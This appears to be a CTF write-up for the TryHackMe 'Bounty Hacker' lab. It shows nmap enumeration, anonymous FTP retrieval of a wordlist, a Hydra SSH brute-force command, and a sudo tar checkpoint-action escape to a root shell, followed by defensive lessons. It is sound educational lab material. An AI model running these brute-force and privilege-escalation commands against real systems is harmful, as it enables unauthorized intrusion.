🤠 TryHackMe - Bounty Hacker (Cowboy Hacker)
Room: Bounty Hacker - Cowboy Hacker
Platform: TryHackMe
Difficulty: Easy / Beginner
Theme: Cowboy Bebop
Category: CTF - Linux Privilege Escalation

TryHackMe
Difficulty
OS
Status

📖 Overview
Bounty Hacker is a beginner-friendly CTF room inspired by Cowboy Bebop.

The room covers the full penetration testing lifecycle:

Enumeration - Nmap + Service Enumeration
Initial Access - Anonymous FTP + Credential Discovery
Brute Force - Hydra SSH Attack
Privilege Escalation - Sudo Misconfiguration (tar GTFOBins)
Perfect room to practice the methodology: Scan -> Enumerate -> Exploit -> PrivEsc -> Flags

🛠️ Tools Used
Tool	Usage
nmap	Port scanning & Service detection
ftp	Anonymous FTP login
hydra	SSH Brute Force
ssh	Remote Access
sudo / tar	Privilege Escalation (GTFOBins)
Kali Linux	Attack Machine
🔍 Walkthrough
1. Enumeration - Nmap
nmap -sC -sV -oN nmap_scan <TARGET_IP>
Open Ports Found:

21/tcp - FTP
22/tcp - SSH
80/tcp - HTTP
2. FTP - Anonymous Login
FTP allows anonymous login, inside we find interesting files:

ftp <TARGET_IP>
Name: anonymous
Password: anonymous
ls -la
get task.txt
get locks.txt
task.txt - Contains hints about the user
locks.txt - Contains a wordlist / password list for brute force
3. SSH Brute Force - Hydra
We got a username from task.txt and a wordlist from locks.txt:

hydra -l lin -P locks.txt ssh://<TARGET_IP>
Hydra cracks the password for user lin.

4. SSH Access
ssh lin@<TARGET_IP>
Now we are inside as a low-privileged user lin.

Check flags:

ls -la /home/lin/
cat /home/lin/user.txt
5. Privilege Escalation - Sudo tar
Check what we can run as sudo:

sudo -l
Output:

User lin may run the following commands on ip-10-112-157-177:
    (root) /bin/tar
lin can run /bin/tar as root. This is vulnerable to GTFOBins abuse.

Exploit it with checkpoint-action:

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
Verify:

whoami
# Output: root
id
# Output: uid=0(root) gid=0(root)
6. Root Flag
cat /root/root.txt
🚩 Flags
Flag	Location
user.txt	/home/lin/user.txt
root.txt	/root/root.txt
⚠️ Flags are redacted from this repo. Replace with your own flags after completing the room.

🧠 Key Learnings
Never allow Anonymous FTP - It leaks sensitive files and wordlists.
Never use weak / guessable passwords - Hydra can brute-force SSH in minutes.
Least Privilege Principle - Never give a user sudo access to tar, vim, find, nmap etc. without restrictions. Check GTFOBins for dangerous binaries.
Always check sudo -l - It's the first step in any Linux PrivEsc.
🔗 References
Room: https://tryhackme.com/room/cowboyhacker
GTFOBins - tar: https://gtfobins.github.io/gtfobins/tar/
TryHackMe Official Walkthrough
👨‍💻 Author
Ahmed Ashraf

TryHackMe Labs & CTF Writeups
Focus: Penetration Testing / Linux PrivEsc / Metasploit
This writeup is for educational purposes only in an authorized lab environment. Do not use these techniques on systems you don't own or don't have permission to test.

